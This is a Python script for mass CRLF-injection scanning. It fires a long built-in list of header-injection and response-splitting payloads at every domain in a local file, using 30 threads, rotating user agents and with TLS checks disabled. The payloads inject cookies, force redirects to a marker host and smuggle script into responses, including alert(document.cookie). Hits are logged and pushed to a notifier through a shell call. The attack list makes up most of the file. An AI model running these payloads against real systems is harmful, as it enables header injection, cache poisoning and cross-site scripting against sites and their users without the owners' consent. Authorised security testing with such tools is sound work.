#!/usr/bin/python3

import os
import time
import logging
import random
import re
import requests
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, init
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


init(autoreset=True)


import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36"
]


REGEX_PATTERNS = [
    r'(?m)(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)?loxs\.pages\.dev\/?(\/|[^.].*)?$|'
    r'(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=(injection|injected|hi)(?:\s*?)(?:$|;)|loxs-x))'
]


def get_random_user_agent():
    return random.choice(USER_AGENTS)


def get_retry_session(retries=3, backoff_factor=0.3, status_forcelist=(500, 502, 504)):
    session = requests.Session()
    retry = Retry(
        total=retries,
        read=retries,
        connect=retries,
        backoff_factor=backoff_factor,
        status_forcelist=status_forcelist,
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session


def generate_payloads(url):
    domain = urlparse(url).netloc
    base_payloads = [
        "/%%0a0aSet-Cookie:loxs=injected",
        "/%0aSet-Cookie:loxs=injected;",
        "/%0aSet-Cookie:loxs=injected",
        "/%0d%0aLocation: http://loxs.pages.dev",
        "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23",
        "/%0d%0a%0d%0a<script>alert('LOXS')</script>;",
        "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e",
        "/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('LOXS');</script>",
        "/%0d%0aHost: {{Hostname}}%0d%0aCookie: loxs=injected%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: loxs=injected%0d%0a%0d%0a",
        "/%0d%0aLocation: loxs.pages.dev",
        "/%0d%0aSet-Cookie:loxs=injected;",
        "/%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>",
        "/%23%0aSet-Cookie:loxs=injected",
        "/%25%30%61Set-Cookie:loxs=injected",
        "/%2e%2e%2f%0d%0aSet-Cookie:loxs=injected",
        "/%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a<script>alert(document.cookie)</script>%2F../%2F..%2F..%2F..%2F../tr",
        "/%3f%0d%0aLocation:%0d%0aloxs-x:loxs-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>",
        "/%5Cr%20Set-Cookie:loxs=injected;",
        "/%5Cr%5Cn%20Set-Cookie:loxs=injected;",
        "/%5Cr%5Cn%5CtSet-Cookie:loxs%5Cr%5CtSet-Cookie:loxs=injected;",
        "/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:loxs=injected;",
        "/%E5%98%8A%E5%98%8DLocation:loxs.pages.dev",
        "/%E5%98%8D%E5%98%8ALocation:loxs.pages.dev",
        "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
        "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected;",
        "/%u000ASet-Cookie:loxs=injected;",
        "/loxs.pages.dev/%2E%2E%2F%0D%0Aloxs-x:loxs-x",
        "/loxs.pages.dev/%2F..%0D%0Aloxs-x:loxs-x",
        "/%%0a0aSet-Cookie:loxs=injection",
        "/%0aSet-Cookie:loxs=hi;",
        "/%0aSet-Cookie:loxs=injection",
        "%0d%0aHost:%20{{Hostname}}%0d%0aCookie:%20loxs=hi%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aSet-Cookie:%20loxs=hi%0d%0a%0d%0a",
        "/%0d%0aSet-Cookie:loxs=hi;",
        "/%0d%0aSet-Cookie:loxs=injection",
        "/%0dSet-Cookie:loxs=hi;",
        "/%0dSet-Cookie:loxs=injection",
        "/%23%0aSet-Cookie:loxs=injection",
        "/%23%0d%0aSet-Cookie:loxs=injection",
        "/%23%0dSet-Cookie:loxs=injection",
        "/%250aSet-Cookie:loxs=injection",
        "/%25250aSet-Cookie:loxs=injection",
        "/%25%30%61Set-Cookie:loxs=injection",
        "/%25%30aSet-Cookie:loxs=injection",
        "/%2e%2e%2f%0d%0aSet-Cookie:loxs=injection",
        "/%2F..%0d%0aSet-Cookie:loxs=injection",
        "/%2f%2e%2e%0d%0aSet-Cookie:loxs=injection",
        "/%3f%0d%0aLocation:%0d%0aloxs-x:loxs-x%0d%aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E",
        "/%3f%0d%0aSet-Cookie:loxs=injection",
        "/%3f%0dSet-Cookie:loxs=injection",
        "/%5Cr%20Set-Cookie:loxs=hi;",
        "/%5Cr%5Cn%20Set-Cookie:loxs=hi;",
        "/%5Cr%5Cn%5CtSet-Cookie:loxs%5Cr%5CtSet-Cookie:loxs=hi;",
        "/%5Cr%5Cn%5CtSet-Cookie:loxs=hi;",
        "/%5Cr%5CnSet-Cookie:loxs=hi;",
        "/%5Cr%5CtSet-Cookie:loxs=hi;",
        "/%5CrSet-Cookie:loxs=hi;",
        "/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:loxs=hi;",
        "/%E5%98%8A%E5%98%8DSet-Cookie:loxs=hi",
        "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=hi",
        "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injection",
        "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injection;",
        "/%E5%98%8D%E5%98%8ASet-Cookie:loxsinjection=loxsxp",
        "/\r%20Set-Cookie:loxs=hi;",
        "/\r\n%20Set-Cookie:loxs=hi;",
        "\r\nHost: {{Hostname}}\r\nCookie: loxs=hi\r\n\r\nHTTP/1.1 200 OK\r\nSet-Cookie: loxs=hi\r\n\r\n",
        "/\r\nSet-Cookie:loxs=hi;",
        "/\r\n\tSet-Cookie:loxs=hi;",
        "/\rSet-Cookie:loxs=hi;",
        "/\r\tSet-Cookie:loxs=hi;",
        "/%u000ASet-Cookie:loxs=hi;",
        "/%u000aSet-Cookie:loxs=injection",
        "/www.google.com/%2E%2E%2F%0D%0Aloxs-x:loxs-x",
        "/www.google.com/%2F..%0D%0Aloxs-x:loxs-x",
        "//www.google.com/%2F%2E%2E%0D%0Aloxs-x:loxs-x",
        "/%0d%0ahost:%http://20loxs.pages.dev",
        "/%0d%0ahost:%http://20loxs.pages.dev%0d%0a",
        "/%5Cr%5Cnhost:%http://20loxs.pages.dev%5Cr%5Cn",
        "/\r\nhost:%http://20loxs.pages.dev\r\n",
        "/%0d%0aLocation:http://loxs.pages.dev%0d%0a",
        "/%23%0D%0ALocation:http://loxs.pages.dev;",
        "/%5cr%5cnLocation:http://loxs.pages.dev",
        "/%E5%98%8A%E5%98%8DLocation:http://loxs.pages.dev",
        "/%E5%98%8D%E5%98%8ALocation:http://loxs.pages.dev",
        "/\r\nLocation:http://loxs.pages.dev"
    ]
    return [payload.replace('{{Hostname}}', domain) for payload in base_payloads]


def check_crlf_vulnerability(url, payload):
    target_url = f"{url}{payload}"
    start_time = time.time()

    headers = {
        'User-Agent': get_random_user_agent(),
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close'
    }

    try:
        session = get_retry_session()
        response = session.get(target_url, headers=headers, allow_redirects=False, verify=False, timeout=10)
        response_time = time.time() - start_time

        is_vulnerable = False
        vulnerability_details = []

        for header, value in response.headers.items():
            combined_header = f"{header}: {value}"
            if any(re.search(pattern, combined_header, re.IGNORECASE) for pattern in REGEX_PATTERNS):
                is_vulnerable = True
                vulnerability_details.append(combined_header)

        if is_vulnerable:
            print(Fore.RED + f"[VULNERABLE] {target_url} - {response_time:.2f}s")
            for detail in vulnerability_details:
                print(Fore.YELLOW + detail)
                with open("crlf_vuln.txt",'a') as file: file.write(Fore.RED + f"[VULNERABLE] {target_url} - {response_time:.2f}s"+'\n')
                os.system ("cat crlf_vuln.txt | notify")
        else:
            print(Fore.GREEN + f"[SAFE] {target_url} - {response_time:.2f}s")

    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[ERROR] {target_url}: {e}")


def run_crlf_scanner():
    url_file_path = os.path.join(os.getcwd(), 'live_domains.txt')

    
    if not os.path.isfile(url_file_path):
        print(Fore.RED + f"File not found: {url_file_path}")
        return

    
    with open(url_file_path, 'r') as f:
        urls = [line.strip() for line in f if line.strip()]

    
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = []
        for url in urls:
            payloads = generate_payloads(url)
            for payload in payloads:
                futures.append(executor.submit(check_crlf_vulnerability, url, payload))

        for future in as_completed(futures):
            future.result()  

if __name__ == "__main__":
    run_crlf_scanner()
